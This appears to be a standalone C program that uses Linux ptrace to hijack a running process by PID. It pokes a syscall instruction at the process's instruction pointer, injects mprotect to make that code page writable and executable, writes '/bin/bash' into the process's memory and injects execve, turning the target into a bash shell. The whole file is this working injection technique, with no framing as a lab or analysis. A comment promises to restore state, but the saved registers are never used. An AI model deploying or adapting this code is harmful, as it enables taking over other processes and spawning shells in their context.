#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/uio.h>
#include <sys/mman.h>

#define DIE(s) {perror(s); exit(1);}

int inject_syscall (pid_t pid, struct user_regs_struct *regs, int syscall,
		    int p1, int p2, int p3, int p4) {
  int status;
  
  regs->rax = syscall;
  regs->rdi = p1;
  regs->rsi = p2;
  regs->rdx = p3;
  regs->rcx = p4;

  if (ptrace (PTRACE_SETREGS,pid,0,regs) < 0)  DIE ("PTRACE_SETREGS:");
  if (ptrace (PTRACE_SINGLESTEP,pid,0,0) < 0)  DIE ("PTRACE_SINGLESTEP:");
  wait (&status);

  return status;
}


int main (int argc, char *argv[]) {
  struct user_regs_struct  regs;
  struct user_regs_struct  old_regs;
  int                      status;
  pid_t                    pid = atoi(argv[1]);
  uint64_t                 v;
  struct iovec             local1[3], remote[1];
  int                      pagesize = sysconf (_SC_PAGESIZE);
  char                     *path = "/bin/bash";
  ssize_t                  len = strlen(path) + 1; // copy 0

  // --------------------------------------
  // Prepare to use process_vm_writev
  if (ptrace (PTRACE_SEIZE,     pid, 0, 0) < 0) DIE("PTRACE_SEIZE:");
  if (ptrace (PTRACE_INTERRUPT, pid, 0, 0) < 0) DIE ("PTRACE_INTERRUPT:");
  wait (&status);
  if (ptrace (PTRACE_GETREGS,   pid, 0, &regs) < 0)  DIE ("PTRACE_GETREGS:");
  // We need to poke the syscall to change memory permissions at target
  if (ptrace (PTRACE_POKETEXT, pid, regs.rip, 0x000000000000050f) < 0)  DIE ("PTRACE_POKETEXT:");
  inject_syscall (pid, &regs, 10,
		  regs.rip & ~(pagesize - 1), pagesize, PROT_WRITE | PROT_READ | PROT_EXEC,0);
  // ----------------------------

  local1[0].iov_base = path;
  local1[0].iov_len  = len;

  remote[0].iov_base = (void*) regs.rip + 2; // Copy just after syscall
  remote[0].iov_len  = len;
  process_vm_writev (pid, local1, 1, remote, 1, 0);

  inject_syscall (pid, &regs, 59, regs.rip + 2, 0, 0, 0);
  // ------------------------------
  // Restore and continue
  if (ptrace (PTRACE_DETACH,   pid,        0,         0) < 0) DIE ("PTRACE_DETACH:");
  return 0;	    
}
